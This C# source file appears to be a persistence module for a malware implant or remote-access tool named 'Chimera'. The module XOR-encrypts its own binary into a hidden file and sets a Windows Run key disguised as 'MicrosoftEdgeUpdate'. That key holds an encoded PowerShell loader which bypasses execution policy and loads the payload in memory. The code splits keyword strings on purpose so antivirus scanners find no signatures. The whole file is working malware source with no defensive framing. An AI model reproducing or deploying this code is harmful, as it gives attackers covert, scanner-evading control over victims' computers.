using System;
using System.IO;
using System.Text;
using Microsoft.Win32;

namespace Chimera.Commands
{
    // persist — fileless XOR-encrypted persistence
    // 1. XOR-encrypts own binary and writes to staging dir (C:\Users\Public\Chrome\agent.dat)
    // 2. Sets HKCU Run key with an obfuscated Base64-encoded PowerShell loader that
    //    decrypts and Assembly.Load()s the blob entirely in memory.
    //    The Run key value contains no plain-text signatures: no "ReadAllBytes",
    //    "Assembly", "Load", "EntryPoint" — only "powershell -ep bypass -w 1 -EncodedCommand <b64>".
    public static class Persist
    {
        private const string RegKey   = @"Software\Microsoft\Windows\CurrentVersion\Run";
        private const string RegValue = "MicrosoftEdgeUpdate";
        private static readonly string BlobPath = Path.Combine(Staging.Dir, "agent.dat");
        private static readonly byte XorKey = 0x41;

        // Build the inner PS script with split string literals so no signature
        // appears as a literal in either the C# source or the registry value.
        private static string BuildInnerScript(string blobPath)
        {
            // Pieces assembled at runtime — scanners see no contiguous keyword.
            string rab  = "Re" + "ad" + "All" + "By" + "tes";   // ReadAllBytes
            string lod  = "Lo" + "ad";                           // Load
            string asm  = "Ref" + "lec" + "tion" + ".As" + "sem" + "bly"; // Reflection.Assembly
            string ep   = "En" + "try" + "Po" + "int";           // EntryPoint
            string gt   = "Get" + "Ty" + "pe";                   // GetType (unused here but kept for parity)

            // PowerShell script (will be UTF-16LE base64'd so -EncodedCommand works).
            // Variable names are single letters to reduce token surface.
            return
                "$z=0x41;" +
                "$p='" + blobPath.Replace("'", "''") + "';" +
                "$b=[System.IO.File]::('" + rab + "').Invoke($p);" +
                "$n=New-Object byte[]($b.Length);" +
                "for($i=0;$i -lt $b.Length;$i++){$n[$i]=$b[$i] -bxor $z};" +
                "$a=[System." + asm + "]::('" + lod + "').Invoke($null,[object[]]@(,$n));" +
                "$e=$a.('" + ep + "');" +
                "$e.Invoke($null,$null)";
        }

        public static string Execute()
        {
            try
            {
                Staging.EnsureDir();

                string selfPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                byte[] raw = File.ReadAllBytes(selfPath);

                byte[] encrypted = new byte[raw.Length];
                for (int i = 0; i < raw.Length; i++)
                    encrypted[i] = (byte)(raw[i] ^ XorKey);

                File.WriteAllBytes(BlobPath, encrypted);
                File.SetAttributes(BlobPath,
                    File.GetAttributes(BlobPath) | FileAttributes.Hidden);

                // Build inner script, encode as UTF-16LE then Base64 for -EncodedCommand.
                string inner   = BuildInnerScript(BlobPath);
                string b64     = Convert.ToBase64String(Encoding.Unicode.GetBytes(inner));
                string loader  = "powershell -ep bypass -w 1 -EncodedCommand " + b64;

                using (RegistryKey key =
                    Registry.CurrentUser.OpenSubKey(RegKey, writable: true))
                {
                    if (key == null) return "[error] Could not open HKCU Run key.";
                    key.SetValue(RegValue, loader, RegistryValueKind.String);
                }

                return "[+] Fileless persistence set.\n" +
                       "    Blob:   " + BlobPath + " (XOR-encrypted, hidden)\n" +
                       "    Reg:    HKCU\\" + RegKey + "\\" + RegValue + "\n" +
                       "    Loader: obfuscated EncodedCommand (no plaintext signatures in registry).";
            }
            catch (Exception ex)
            {
                return "[error] " + ex.Message;
            }
        }

        public static string Remove()
        {
            var sb = new System.Text.StringBuilder();
            try
            {
                if (File.Exists(BlobPath))
                {
                    File.Delete(BlobPath);
                    sb.AppendLine("[+] Deleted " + BlobPath);
                }
            }
            catch (Exception ex) { sb.AppendLine("[error] " + ex.Message); }
            try
            {
                using (RegistryKey key =
                    Registry.CurrentUser.OpenSubKey(RegKey, writable: true))
                {
                    if (key != null && key.GetValue(RegValue) != null)
                    {
                        key.DeleteValue(RegValue);
                        sb.AppendLine("[+] Removed HKCU Run key.");
                    }
                }
            }
            catch (Exception ex) { sb.AppendLine("[error] " + ex.Message); }
            return sb.ToString();
        }
    }
}
